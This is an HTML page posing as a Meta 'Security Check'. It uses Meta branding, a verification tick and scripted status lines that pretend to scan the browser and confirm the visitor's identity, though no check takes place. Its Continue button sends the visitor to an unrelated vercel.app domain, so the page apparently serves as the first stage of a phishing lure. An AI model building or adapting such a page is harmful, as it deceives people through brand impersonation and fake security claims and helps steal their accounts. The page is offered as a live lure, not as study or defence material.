<!DOCTYPE html>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<title>Security Check</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body{
  margin:0;
  font-family:Arial,Helvetica,sans-serif;
  background:#ffffff;
  height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
}

.card{
  width:340px;
  background:#fff;
  border-radius:12px;
  box-shadow:0 10px 25px rgba(0,0,0,.15);
  padding:30px;
  text-align:center;
  border:1px solid #e5e5e5;
}

/* LOGO */
.logo{
  width:80px;
  height:80px;
  border-radius:50%;
  background:#1877f2;
  color:#fff;
  display:flex;
  align-items:center;
  justify-content:center;
  font-size:34px;
  font-weight:bold;
  margin:0 auto 10px;
}

/* NAME + TICK */
.name{
  display:flex;
  justify-content:center;
  align-items:center;
  gap:6px;
  font-size:22px;
  font-weight:bold;
}

.tick{
  width:18px;
  height:18px;
  background:#1d9bf0;
  color:#fff;
  border-radius:50%;
  font-size:12px;
  display:flex;
  align-items:center;
  justify-content:center;
}

h1{
  margin:15px 0 5px;
}

p{
  color:#555;
  font-size:15px;
}

/* LOADER */
.loader{
  width:36px;
  height:36px;
  border:4px solid #ddd;
  border-top:4px solid #1877f2;
  border-radius:50%;
  margin:18px auto;
  animation:spin 1s linear infinite;
}

@keyframes spin{
  0%{transform:rotate(0deg)}
  100%{transform:rotate(360deg)}
}

/* STATUS */
.status{
  text-align:left;
  font-size:14px;
  margin-top:10px;
}
.status span{
  display:block;
  opacity:0;
  margin:6px 0;
  transition:.4s;
}
.status span.show{opacity:1}

/* BUTTON */
button{
  width:100%;
  padding:12px;
  margin-top:20px;
  border:none;
  border-radius:6px;
  background:#1877f2;
  color:#fff;
  font-size:16px;
  font-weight:bold;
  cursor:pointer;
  display:none;
}
button:hover{background:#145dbf}

.footer{
  margin-top:12px;
  font-size:12px;
  color:#888;
}
</style>
</head>

<body>

<div class="card">
  <div class="logo">Meta</div>

  <div class="name">
   Meta Secure System
    <div class="tick">✔</div>
  </div>

  <h1>Security Check</h1>
  <p>We need to verify your identity</p>

  <div class="loader" id="loader" style="display: none;"></div>

  <div class="status">
    <span id="a" class="show">✔ Initializing system…</span>
    <span id="b" class="show">✔ Scanning browser…</span>
    <span id="c" class="show">✔ Verifying connection…</span>
    <span id="d" class="show">✔ Verification Successfully completed</span>
  </div>

  <button id="btn" onclick="goNext()" style="display: block;">Continue</button>
  <div class="footer">Protected by Secure System</div>
</div>

<script>
const steps=["a","b","c","d"];
let i=0;

function run(){
  if(i<steps.length){
    document.getElementById(steps[i]).classList.add("show");
    i++;
    setTimeout(run,900);
  }else{
    document.getElementById("loader").style.display="none";
    document.getElementById("btn").style.display="block";
  }
}
run();

function goNext(){
  window.location.href="https://review-help-case-here.vercel.app/";
}
</script>



</body></html>
